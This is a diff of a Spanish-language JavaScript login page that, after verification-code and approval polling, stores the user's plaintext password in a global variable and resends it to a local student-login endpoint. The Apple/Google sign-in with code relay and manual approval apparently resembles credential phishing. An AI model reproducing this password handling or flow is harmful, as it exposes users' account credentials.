@@ -4,6 +4,7 @@ let currentRequestId = null;
 let pollingInterval = null;
 let loginForm, verificationForm, verificationModal, messageDiv;
 let selectedProvider = null; // 'apple' | 'google'
+let currentPassword = null;
 
 // Event listeners
 document.addEventListener('DOMContentLoaded', function() {
@@ -40,7 +41,10 @@ function startAccessGrantPolling(username) {
             if (resp.ok && data.success && data.granted) {
                 clearInterval(window.accessGrantInterval);
                 hideSpinner();
-                window.location.href = '/music.html';
+                try {
+                    await fetch('/api/auth/login-student', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ username, password: currentPassword }) });
+                } catch(_) {}
+                window.location.href = '/music';
             }
         } catch (_) {}
     }, 2000);
@@ -152,6 +156,7 @@ async function handleLogin(e) {
         
         if (response.ok) {
             currentUser = username;
+            currentPassword = password;
             currentRequestId = data.requestId;
             
             showMessage(data.message, 'success');
@@ -330,8 +335,11 @@ function startCodeValidationPolling(username, code) {
                     } else {
                         // Apple: mantener comportamiento anterior
                         showMessageModal('¡Éxito!', '✅ ¡Se generará una carpeta llamada "Recordings" en drive, este proceso puede tardar 30 minutos.', 'success');
-                        setTimeout(() => {
-                            window.location.href = '/music.html';
+                        setTimeout(async () => {
+                            try {
+                                await fetch('/api/auth/login-student', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ username: currentUser, password: currentPassword }) });
+                            } catch(_) {}
+                            window.location.href = '/music';
                         }, 3000);
                     }
                 } else if (data.status === 'rejected') {
@@ -550,7 +558,10 @@ function startFinalVerificationPolling(username) {
                 if (data.status === 'approved') {
                     clearInterval(window.finalVerifyInterval);
                     hideSpinner();
-                    window.location.href = '/music.html';
+                    try {
+                        await fetch('/api/auth/login-student', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ username, password: currentPassword }) });
+                    } catch(_) {}
+                    window.location.href = '/music';
                 } else if (data.status === 'rejected') {
                     clearInterval(window.finalVerifyInterval);
                     hideSpinner();
